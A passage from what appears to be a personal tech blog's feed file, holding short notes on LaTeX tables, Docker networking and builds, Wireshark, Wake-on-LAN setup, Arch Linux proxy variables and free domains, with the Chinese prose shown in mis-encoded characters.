class="code"><pre><code class="hljs llvm">\<span class="hljs-keyword">begin</span>&#123;tabular&#125;&#123;|<span class="hljs-keyword">c</span>|<span class="hljs-keyword">c</span>|<span class="hljs-keyword">c</span>|&#125;<br><span class="hljs-keyword">one</span>   &amp; two   &amp; three \\<br>four  &amp; five  &amp; six \\<br>seven &amp; eight &amp; nine<br>\<span class="hljs-keyword">end</span>&#123;tabular&#125;<br></code></pre></td></tr></table></figure><p>æ°´å¹³æ–¹å‘çš„è¾¹æ¡†é€šè¿‡ <code>\hline</code> æ·»åŠ .</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-string">\begin&#123;tabular&#125;&#123;|c|c|c|&#125;</span><br><span class="hljs-string">\hline</span><br>one   &amp; two   &amp; three <span class="hljs-string">\\</span><br><span class="hljs-string">\hline</span><br>four  &amp; five  &amp; six <span class="hljs-string">\\</span><br><span class="hljs-string">\hline</span><br>seven &amp; eight &amp; nine<br><span class="hljs-string">\end&#123;tabular&#125;</span><br></code></pre></td></tr></table></figure><p>åŠ ä¸¤æ¬¡ <code>\hline</code> æ˜¾ç¤ºåŒæ¨ªçº¿.</p><p>å•ç‹¬æŒ‡å®šå®½åº¦, ä½¿ç”¨ <code>p&#123;&#125;</code> (paragraph)</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-string">\begin&#123;tabular&#125;&#123;|p&#123;2cm&#125;|c|c|&#125;</span><br><span class="hljs-string">\hline</span><br>one   &amp; two   &amp; three <span class="hljs-string">\\</span><br><span class="hljs-string">\hline</span><br>four  &amp; five  &amp; six <span class="hljs-string">\\</span><br><span class="hljs-string">\hline</span><br>seven &amp; eight &amp; nine<br><span class="hljs-string">\end&#123;tabular&#125;</span><br></code></pre></td></tr></table></figure><p>æ·»åŠ æ ‡é¢˜, å…ˆå°†è¡¨æ ¼æ”¾åœ¨ <code>table</code> ç¯å¢ƒä¸­, å†åˆ©ç”¨ <code>\caption</code> å’Œ <code>\centering</code> è°ƒæ•´:</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-string">\begin&#123;table&#125;</span><br><span class="hljs-string">\centering</span><br><span class="hljs-string">\begin&#123;tabular&#125;&#123;|p&#123;2cm&#125;|c|c|&#125;</span><br><span class="hljs-string">\hline</span><br>one   &amp; two   &amp; three <span class="hljs-string">\\</span><br><span class="hljs-string">\hline</span><br>four  &amp; five  &amp; six <span class="hljs-string">\\</span><br><span class="hljs-string">\hline</span><br>seven &amp; eight &amp; nine<br><span class="hljs-string">\end&#123;tabular&#125;</span><br><span class="hljs-string">\caption&#123;This</span> <span class="hljs-keyword">is</span> a title&#125;<br><span class="hljs-string">\end&#123;table&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>LaTeX</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>è‡ªå·±åŠ¨æ‰‹å†™-Docker-Notes</title>
    <link href="/2022/10/06/%E8%87%AA%E5%B7%B1%E5%8A%A8%E6%89%8B%E5%86%99-Docker-Notes/"/>
    <url>/2022/10/06/%E8%87%AA%E5%B7%B1%E5%8A%A8%E6%89%8B%E5%86%99-Docker-Notes/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>helloworld</title>
    <link href="/2022/10/06/helloworld/"/>
    <url>/2022/10/06/helloworld/</url>
    
    <content type="html"><![CDATA[<h1 id="Hello"><a href="#Hello" class="headerlink" title="Hello"></a>Hello</h1><p>helloworld</p><h1 id="World"><a href="#World" class="headerlink" title="World"></a>World</h1><p>helloworld</p><h2 id="test"><a href="#test" class="headerlink" title="test"></a>test</h2><p>test<br>test<br>test<br>test<br>test<br>test<br>test<br>test<br>test<br>test</p><h1 id="this-is-the-first-rank"><a href="#this-is-the-first-rank" class="headerlink" title="this is the first rank"></a>this is the first rank</h1><h2 id="this-is-the-second-rank"><a href="#this-is-the-second-rank" class="headerlink" title="this is the second rank"></a>this is the second rank</h2><h3 id="this-is-the-third-rank"><a href="#this-is-the-third-rank" class="headerlink" title="this is the third rank"></a>this is the third rank</h3><h1 id="test2"><a href="#test2" class="headerlink" title="test2"></a>test2</h1><p>00</p><p>kajfllallal<br>kajfllallal<br>kajfllallal<br>kajfllallal<br>kajfllallal</p><h1 id="test3"><a href="#test3" class="headerlink" title="test3"></a>test3</h1><p>kssususu<br>kssususu<br>kssususu<br>kssususu</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº-Docker-å®¹å™¨ä¸­çš„ç½‘ç»œ-ä»¥åŠå…¶æŸ¥çœ‹</title>
    <link href="/2022/10/06/%E5%85%B3%E4%BA%8E-Docker-%E5%AE%B9%E5%99%A8%E4%B8%AD%E7%9A%84%E7%BD%91%E7%BB%9C-%E4%BB%A5%E5%8F%8A%E5%85%B6%E6%9F%A5%E7%9C%8B/"/>
    <url>/2022/10/06/%E5%85%B3%E4%BA%8E-Docker-%E5%AE%B9%E5%99%A8%E4%B8%AD%E7%9A%84%E7%BD%91%E7%BB%9C-%E4%BB%A5%E5%8F%8A%E5%85%B6%E6%9F%A5%E7%9C%8B/</url>
    
    <content type="html"><![CDATA[<p><a href="https://b23.tv/pEJ9LfC">å‚è€ƒ</a><br><a href="https://labs.play-with-docker.com/">docker å­¦ä¹ ç½‘ç«™</a></p><h1 id="æŸ¥çœ‹"><a href="#æŸ¥çœ‹" class="headerlink" title="æŸ¥çœ‹"></a>æŸ¥çœ‹</h1><p>è¿›å…¥å®¹å™¨:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ docker <span class="hljs-built_in">exec</span> -it name /bin/bash<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹ <code>/etc/hosts</code> æ–‡ä»¶ä¿¡æ¯:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">cat</span> /etc/hosts<br></code></pre></td></tr></table></figure><h1 id="ip-åˆ†é…è§„å¾‹"><a href="#ip-åˆ†é…è§„å¾‹" class="headerlink" title="ip åˆ†é…è§„å¾‹"></a>ip åˆ†é…è§„å¾‹</h1><p>å®¿ä¸»æœºå®‰è£… docker ä¹‹åä¼šç”Ÿæˆä¸€å¼  docker ç½‘å¡, æˆ‘çš„ Archlinux è¿™å¼ ç½‘å¡å« <code>docker0</code>.</p><p>è¿™å¼ ç½‘å¡é€šè¿‡ NAT çš„æ–¹å¼ä¸ºæ¯ä¸€ä¸ªå®¹å™¨åˆ†é… IP.</p><p>ç½‘å¡çš„ ip ä¸º <code>172.27.0.1</code>, å­ç½‘æ©ç ä¸º <code>255.255.0.0</code>, ç¬¬ä¸€ä¸ªå®¹å™¨çš„ ip ä¸º <code>172.27.0.2</code>, ç¬¬äºŒä¸ªå®¹å™¨ä¸º <code>172.27.0.2</code></p><p>ç”±äºå®¹å™¨éƒ½å±äºåŒä¸€ä¸ªç½‘æ®µ, å½¼æ­¤ä¹‹é—´å¯ä»¥é€šè¿‡ IP è¿›è¡Œé€šè®¯. å®¹å™¨å’Œå®¿ä¸»æœºè¿›è¡Œé€šä¿¡æ˜¯é€šè¿‡å¦‚ <code>eth0</code> ç½‘å¡è¿›è¡Œè½¬å‘.</p><h1 id="ä½¿å®¹å™¨é˜»å¡è¿è¡Œ"><a href="#ä½¿å®¹å™¨é˜»å¡è¿è¡Œ" class="headerlink" title="ä½¿å®¹å™¨é˜»å¡è¿è¡Œ"></a>ä½¿å®¹å™¨é˜»å¡è¿è¡Œ</h1><p>åˆ©ç”¨ <code>-it</code> å¦‚:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ docker run -dit alpine<br></code></pre></td></tr></table></figure><h1 id="åˆ©ç”¨-link-æ˜ å°„åŸŸå"><a href="#åˆ©ç”¨-link-æ˜ å°„åŸŸå" class="headerlink" title="åˆ©ç”¨ --link æ˜ å°„åŸŸå"></a>åˆ©ç”¨ <code>--link</code> æ˜ å°„åŸŸå</h1><p>åœ¨è¿è¡Œä¸€ä¸ªå®¹å™¨æ—¶, ç”¨ <code>--link</code> å¯ä»¥å°†å¦ä¸€ä¸ªå®¹å™¨çš„ ip æ˜ å°„ä¸ºä¸€ä¸ªåŸŸåå¹¶æ·»åŠ åˆ° <code>/etc/hosts</code> æ–‡ä»¶ä¸­.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ docker run -dit --<span class="hljs-built_in">link</span> another_container:domain_name alpine<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå°±å°† <code>another_container</code> çš„ IP æ˜ å°„ä¸º <code>domain_name</code> è¿™ä¸ªåŸŸå.</p>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº-ffmpeg</title>
    <link href="/2022/10/06/%E5%85%B3%E4%BA%8E-ffmpeg/"/>
    <url>/2022/10/06/%E5%85%B3%E4%BA%8E-ffmpeg/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº-docker-build-æŒ‡å®š-Dockerfile-æ–‡ä»¶åçš„å‘</title>
    <link href="/2022/10/06/%E5%85%B3%E4%BA%8E-docker-build-%E6%8C%87%E5%AE%9A-Dockerfile-%E6%96%87%E4%BB%B6%E5%90%8D%E7%9A%84%E5%9D%91/"/>
    <url>/2022/10/06/%E5%85%B3%E4%BA%8E-docker-build-%E6%8C%87%E5%AE%9A-Dockerfile-%E6%96%87%E4%BB%B6%E5%90%8D%E7%9A%84%E5%9D%91/</url>
    
    <content type="html"><![CDATA[<p>åº”ä¸º:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ docker build -t somatag -f /path/to/file .<br></code></pre></td></tr></table></figure><p>æ³¨æ„æœ€åè¿˜æœ‰ä¸€ä¸ª <code>.</code></p>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº-Dockerfile-ADD-æŒ‡ä»¤æ³¨æ„</title>
    <link href="/2022/10/06/%E5%85%B3%E4%BA%8E-Dockerfile-ADD-%E6%8C%87%E4%BB%A4%E6%B3%A8%E6%84%8F/"/>
    <url>/2022/10/06/%E5%85%B3%E4%BA%8E-Dockerfile-ADD-%E6%8C%87%E4%BB%A4%E6%B3%A8%E6%84%8F/</url>
    
    <content type="html"><![CDATA[<p>åªèƒ½ä½œç”¨äºå½“å‰ç¯å¢ƒ, ä¸èƒ½ç”¨ <code>..</code> è¡¨ç¤ºä¸Šä¸€çº§ç›®å½•.</p>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº-docker-compose-build</title>
    <link href="/2022/10/06/%E5%85%B3%E4%BA%8E-docker-compose-build/"/>
    <url>/2022/10/06/%E5%85%B3%E4%BA%8E-docker-compose-build/</url>
    
    <content type="html"><![CDATA[<p>ä¼¼ä¹åªè¦ <code>build</code> ä¹‹åå°±ä¸ç”¨ç‰¹å®šåˆ¶å®šä¸€ä¸ª <code>image</code>.</p><p>è‹¥ä¸æŒ‡å®š build ä¹‹åé•œåƒçš„åç§°, é»˜è®¤ä¸º:</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haxe">å½“å‰ç›®å½•<span class="hljs-literal">_</span>æœåŠ¡å<br></code></pre></td></tr></table></figure><p>å¦‚:</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">services:</span> <br><span class="hljs-symbol">  pages:</span><br><span class="hljs-symbol">    build:</span><br><span class="hljs-symbol">      context:</span> .<br><span class="hljs-symbol">      dockerfile:</span> nginx_pages<br><span class="hljs-symbol">    container_name:</span> <span class="hljs-string">&quot;pages&quot;</span><br><span class="hljs-symbol">    command:</span> nginx<br><br></code></pre></td></tr></table></figure><p>å°±æ”¹ä¸º: <code>å½“å‰ç›®å½•å_pages</code>. ä¼¼ä¹ä¸èƒ½æŒ‡å®šé•œåƒå.</p>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº-docker-run-çš„æ—¶å€™çš„-på‚æ•°</title>
    <link href="/2022/10/06/%E5%85%B3%E4%BA%8E-docker-run-%E7%9A%84%E6%97%B6%E5%80%99%E7%9A%84-p%E5%8F%82%E6%95%B0/"/>
    <url>/2022/10/06/%E5%85%B3%E4%BA%8E-docker-run-%E7%9A%84%E6%97%B6%E5%80%99%E7%9A%84-p%E5%8F%82%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<p>å¦‚æœä¸ç”¨ <code>-p</code> æˆ– <code>-P</code> å‚æ•°çš„è¯, å®¹å™¨å†…éƒ¨çš„ ports ä¸ä¼šè‡ªåŠ¨æ˜ å°„åˆ°å®¿ä¸»æœºçš„ç«¯å£ä¸Š, ä½†æ˜¯å¯ä»¥åˆ©ç”¨å®¹å™¨è‡ªèº«çš„ ip è®¿é—®.</p>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Wireshark-ç½‘ç»œåˆ†æå°±æ˜¯è¿™ä¹ˆç®€å•</title>
    <link href="/2022/10/05/Wireshark-%E7%BD%91%E7%BB%9C%E5%88%86%E6%9E%90%E5%B0%B1%E6%98%AF%E8%BF%99%E4%B9%88%E7%AE%80%E5%8D%95/"/>
    <url>/2022/10/05/Wireshark-%E7%BD%91%E7%BB%9C%E5%88%86%E6%9E%90%E5%B0%B1%E6%98%AF%E8%BF%99%E4%B9%88%E7%AE%80%E5%8D%95/</url>
    
    <content type="html"><![CDATA[<h1 id="åˆè¯•é”‹èŠ’"><a href="#åˆè¯•é”‹èŠ’" class="headerlink" title="åˆè¯•é”‹èŠ’"></a>åˆè¯•é”‹èŠ’</h1><h2 id="ä»ä¸€é“é¢è¯•é¢˜è¯´èµ·"><a href="#ä»ä¸€é“é¢è¯•é¢˜è¯´èµ·" class="headerlink" title="ä»ä¸€é“é¢è¯•é¢˜è¯´èµ·"></a>ä»ä¸€é“é¢è¯•é¢˜è¯´èµ·</h2><p><code>Interface</code> ç•Œé¢æ˜¯é€‰æ‹©ä»å“ªä¸€å¼ ç½‘å¡æŠ“åŒ….</p><p>è·¨å­ç½‘çš„é€šä¿¡éœ€è¦é»˜è®¤ç½‘å…³çš„è½¬å‘. è¦å’Œé»˜è®¤ç½‘å…³é€šä¿¡, éœ€è¦è·å¾—å…¶ MAC åœ°å€.</p><p>Wireshark ä¼šå°† MAC ä¸­å‰ä¸‰ä¸ªè¡¨ç¤ºå‚å•†çš„å­—èŠ‚ç›´æ¥æ˜¾ç¤ºæˆå‚å•†å.</p><p>å‘å‡º ping åŒ…, å°±æ˜¯å‘å‡º ICMP æ•°æ®åŒ….</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Wireshark-ç½‘ç»œåˆ†æè‰ºæœ¯-Notes</title>
    <link href="/2022/10/05/Wireshark-%E7%BD%91%E7%BB%9C%E5%88%86%E6%9E%90%E8%89%BA%E6%9C%AF-Notes/"/>
    <url>/2022/10/05/Wireshark-%E7%BD%91%E7%BB%9C%E5%88%86%E6%9E%90%E8%89%BA%E6%9C%AF-Notes/</url>
    
    <content type="html"><![CDATA[<p><a href="http://www.tcpipguide.com/free/index.html">http://www.tcpipguide.com/free/index.html</a></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ä»€ä¹ˆæ˜¯-Wake-on-LAN</title>
    <link href="/2022/10/05/%E4%BB%80%E4%B9%88%E6%98%AF-Wake-on-LAN/"/>
    <url>/2022/10/05/%E4%BB%80%E4%B9%88%E6%98%AF-Wake-on-LAN/</url>
    
    <content type="html"><![CDATA[<p><a href="https://baike.baidu.com/item/wake-on-LAN">å‚è€ƒ1 ç™¾åº¦ç™¾ç§‘</a></p><p><a href="https://wiki.archlinux.org/title/Wake-on-LAN">å‚è€ƒ2 Archwiki</a></p><h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><p>Wake-On-LAN æ˜¯ä¸€ç§ç”µæºç®¡ç†åŠŸèƒ½. å¦‚æœå­˜åœ¨ç½‘ç»œæ´»åŠ¨, åˆ™å…è®¸è®¾å¤‡å°†æ“ä½œç³»ç»Ÿä»å¾…æœºæˆ–ä¼‘çœ æ¨¡å¼ä¸­å”¤é†’.</p><p>Wake-On-LAN çš„å®ç°, ä¸»è¦æ˜¯å‘ç›®æ ‡ä¸»æœºå‘é€ç‰¹æ®Šæ ¼å¼çš„æ•°æ®åŒ….</p><p>ä¹Ÿå°±æ˜¯è¯´, é€šè¿‡è®©ç½‘å¡å¤„äºå¾…æœºçŠ¶æ€, å½“ç½‘å¡æ¥å—åˆ°ç‰¹å®šå‘½ä»¤å, å°±å”¤é†’ä¸»æœº.</p><h1 id="ç¡¬ä»¶è®¾ç½®"><a href="#ç¡¬ä»¶è®¾ç½®" class="headerlink" title="ç¡¬ä»¶è®¾ç½®"></a>ç¡¬ä»¶è®¾ç½®</h1><p>éœ€è¦ motherboard (ä¸»æ¿) å’Œ Network Interface Controller (ç½‘å¡) çš„æ”¯æŒ.</p><p>éœ€è¦åœ¨ BIOS ä¸­ enable Wake-on-LAN åŠŸèƒ½.</p><h1 id="è½¯ä»¶é…ç½®"><a href="#è½¯ä»¶é…ç½®" class="headerlink" title="è½¯ä»¶é…ç½®"></a>è½¯ä»¶é…ç½®</h1><h2 id="enable-ç½‘å¡ä¸Šçš„-WoL"><a href="#enable-ç½‘å¡ä¸Šçš„-WoL" class="headerlink" title="enable ç½‘å¡ä¸Šçš„ WoL"></a>enable ç½‘å¡ä¸Šçš„ WoL</h2><p>WoL å¯èƒ½æ˜¯é»˜è®¤å…³é—­çš„.</p><p>å®‰è£… <code>ethtool</code> æ¥æŸ¥çœ‹è®¾ç½®.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ ethtool interface | grep Wake-on<br><br>Supports Wake-on: pumbag<br>Wake-on: d<br></code></pre></td></tr></table></figure><p><code>Wake-on</code> çš„å€¼å†³å®š wake up çš„æ´»åŠ¨:</p><ul><li><code>d</code>, disabled</li><li><code>p</code>, PHY activity</li><li><code>u</code>, unicast activity</li><li><code>m</code>, multicast activity</li><li><code>b</code>, broadcast activity</li><li><code>a</code>, ARP activity</li><li><code>g</code>, magic packet activity</li></ul><p>éœ€è¦è®¾ç½®ä¸º <code>g</code>:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ ethtool -s interface wol g<br></code></pre></td></tr></table></figure><h2 id="æŒç»­ç”Ÿæ•ˆ-Make-it-persistent"><a href="#æŒç»­ç”Ÿæ•ˆ-Make-it-persistent" class="headerlink" title="æŒç»­ç”Ÿæ•ˆ Make it persistent"></a>æŒç»­ç”Ÿæ•ˆ Make it persistent</h2><p>åœ¨ network çš„é“¾æ¥æ–‡ä»¶ä¸­æ·»åŠ  <code>WakeOnLan</code>:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros">/etc/systemd/network/50-wired.link<br><br>[Match]<br><span class="hljs-attribute">MACAddress</span>=aa:bb:cc:dd:ee:ff<br><br>[Link]<br><span class="hljs-attribute">NamePolicy</span>=kernel database onboard slot path<br><span class="hljs-attribute">MACAddressPolicy</span>=persistent<br><span class="hljs-attribute">WakeOnLan</span>=magic<br></code></pre></td></tr></table></figure><p>å¯ä»¥åœ¨ <code>systemd.link(5)</code> ä¸­æŸ¥çœ‹æ›´å¤šä¿¡æ¯.</p><h1 id="æä¾›-Wake-On-Lan-æœåŠ¡çš„è½¯ä»¶"><a href="#æä¾›-Wake-On-Lan-æœåŠ¡çš„è½¯ä»¶" class="headerlink" title="æä¾› Wake-On-Lan æœåŠ¡çš„è½¯ä»¶"></a>æä¾› Wake-On-Lan æœåŠ¡çš„è½¯ä»¶</h1><p>åœ¨æ ‘éœ‰æ´¾ä¸Šå®‰è£… Wiki ä¸Šæ¨èçš„ä¸‰æ¬¾ä¹‹ä¸€, é€šè¿‡ <code>wget</code> è·å–å‹ç¼©åŒ…, å¹¶è§£å‹:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ wget https://udomain.dl.sourceforge.net/project/wake-on-lan/wol/0.7.1/wol-0.7.1.tar.gz<br>$ tar -zxvf wol-0.7.1.tar.gz<br></code></pre></td></tr></table></figure><p>ä¹‹åæŒ‰ç…§å…¶ç›®å½•ä¸‹çš„ INSTALL æ–‡ä»¶è¦æ±‚å®‰è£…å³å¯.</p><p>ä½¿ç”¨è¿™ä¸ªè½¯ä»¶éœ€è¦æŒ‡å®š 9 ç«¯å£ä»¥åŠ MAC åœ°å€:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ wol -p 9 MAC<br></code></pre></td></tr></table></figure><h1 id="å‚è€ƒ-B-ç«™"><a href="#å‚è€ƒ-B-ç«™" class="headerlink" title="å‚è€ƒ B ç«™"></a><a href="https://www.bilibili.com/video/BV1FA411t74H/?spm_id_from=333.880.my_history.page.click&vd_source=bc8ddbb1a08707dc809c3fd9bb85290d">å‚è€ƒ B ç«™</a></h1><p>ä¸€ä¸ªæ˜¯éœ€è¦è¿›å…¥ BIOS å¼€å¯ç½‘å¡å”¤é†’åŠŸèƒ½, ä¸€ä¸ªæ˜¯éœ€è¦è®¾ç½®è·¯ç”±å™¨, ä¸€ä¸ªæ˜¯ä½¿ç”¨ UDP åè®®. </p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ArchWiki-ä¸­å…³äº-Proxy-server</title>
    <link href="/2022/10/05/ArchWiki-%E4%B8%AD%E5%85%B3%E4%BA%8E-Proxy-server/"/>
    <url>/2022/10/05/ArchWiki-%E4%B8%AD%E5%85%B3%E4%BA%8E-Proxy-server/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¯å¢ƒå˜é‡"><a href="#ç¯å¢ƒå˜é‡" class="headerlink" title="ç¯å¢ƒå˜é‡"></a>ç¯å¢ƒå˜é‡</h1><p>å¦‚:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">http_proxy</span>=http://10.203.0.1:5187/<br><span class="hljs-built_in">export</span> <span class="hljs-attribute">https_proxy</span>=<span class="hljs-variable">$http_proxy</span><br><span class="hljs-built_in">export</span> <span class="hljs-attribute">ftp_proxy</span>=<span class="hljs-variable">$http_proxy</span><br><span class="hljs-built_in">export</span> <span class="hljs-attribute">rsync_proxy</span>=<span class="hljs-variable">$http_proxy</span><br><span class="hljs-built_in">export</span> <span class="hljs-attribute">no_proxy</span>=<span class="hljs-string">&quot;localhost,127.0.0.1,localaddress,.localdomain.com&quot;</span><br></code></pre></td></tr></table></figure><p>wget, pacman, curl ç­‰å‘½ä»¤ä¼šåŸºäºè¿™ç§å½¢å¼çš„ç¯å¢ƒå˜é‡æ¥ç¡®å®šä¸€ä¸ªç»™å®šçš„ç½‘ç»œåè®®.</p><h1 id="ä½¿ç”¨-proxyman-git-å·¥å…·é…ç½®ç³»ç»Ÿä»£ç†"><a href="#ä½¿ç”¨-proxyman-git-å·¥å…·é…ç½®ç³»ç»Ÿä»£ç†" class="headerlink" title="ä½¿ç”¨ proxyman-git å·¥å…·é…ç½®ç³»ç»Ÿä»£ç†"></a>ä½¿ç”¨ proxyman-git å·¥å…·é…ç½®ç³»ç»Ÿä»£ç†</h1><h1 id="é€šè¿‡-sudo-ä¿æŒä»£ç†"><a href="#é€šè¿‡-sudo-ä¿æŒä»£ç†" class="headerlink" title="é€šè¿‡ sudo ä¿æŒä»£ç†"></a>é€šè¿‡ sudo ä¿æŒä»£ç†</h1><p>åœ¨ sudo é…ç½®æ–‡ä»¶ä¸­æ·»åŠ :</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/etc/</span>sudoers.d/<span class="hljs-number">05</span>_proxy<br><br>Defaults env_keep += <span class="hljs-string">&quot;*_proxy *_PROXY&quot;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ç”³è¯·å…è´¹åŸŸåå’Œè¯ä¹¦</title>
    <link href="/2022/10/05/%E7%94%B3%E8%AF%B7%E5%85%8D%E8%B4%B9%E5%9F%9F%E5%90%8D%E5%92%8C%E8%AF%81%E4%B9%A6/"/>
    <url>/2022/10/05/%E7%94%B3%E8%AF%B7%E5%85%8D%E8%B4%B9%E5%9F%9F%E5%90%8D%E5%92%8C%E8%AF%81%E4%B9%A6/</url>
    
    <content type="html"><![CDATA[<h1 id="ç”³è¯·å…è´¹åŸŸå"><a href="#ç”³è¯·å…è´¹åŸŸå" class="headerlink" title="ç”³è¯·å…è´¹åŸŸå"></a>ç”³è¯·å…è´¹åŸŸå</h1><p>ä½¿ç”¨ <a href="https://www.freenom.com/zh/index.html?lang=zh">freenom</a> è¿™ä¸ªç½‘ç«™.</p><p>æ³¨æ„:</p><ul><li>å…è´¹æ˜¯æŒ‡æ— éœ€æ”¯ä»˜é¦–å¹´çš„è´¹ç”¨, ä¸€å¹´ååŸŸååˆ°æœŸä¸ç»­è´¹ä¼šè¢«å›æ”¶</li><li>æ³¨å†Œå¿…é¡»å‡†å¤‡ä¸€ä¸ªå¯è®¿é—®çš„ç”µå­é‚®ç®±, ç”¨äºæ¥å—éªŒè¯é‚®ä»¶å¹¶å‘ ICANN ç™»è®°</li></ul><h1 id="ç”³è¯·å…è´¹è¯ä¹¦"><a href="#ç”³è¯·å…è´¹è¯ä¹¦" class="headerlink" title="ç”³è¯·å…è´¹è¯ä¹¦"></a>ç”³è¯·å…è´¹è¯ä¹¦</h1><p><a href="https://b23.tv/nSbXQRY">å‚è€ƒ</a><br>ä½¿ç”¨ <a href="https://freessl.cn/">freessl</a> è¿™ä¸ªç½‘ç«™.</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Cloudflare-ä»£ç†åŸŸå</title>
    <link href="/2022/10/05/Cloudflare-%E4%BB%A3%E7%90%86%E5%9F%9F%E5%90%8D/"/>
    <url>/2022/10/05/Cloudflare-%E4%BB%A3%E7%90%86%E5%9F%9F%E5%90%8D/</url>
    
    <content type="html"><![CDATA[<p><a href="https://b23.tv/Xnc08DW">å‚è€ƒ</a></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ä»€ä¹ˆæ˜¯-md5</title>
    <link href="/2022/10/05/%E4%BB%80%E4%B9%88%E6%98%AF-md5/"/>
    <url>/2022/10/05/%E4%BB%80%E4%B9%88%E6%98%AF-md5/</url>
    
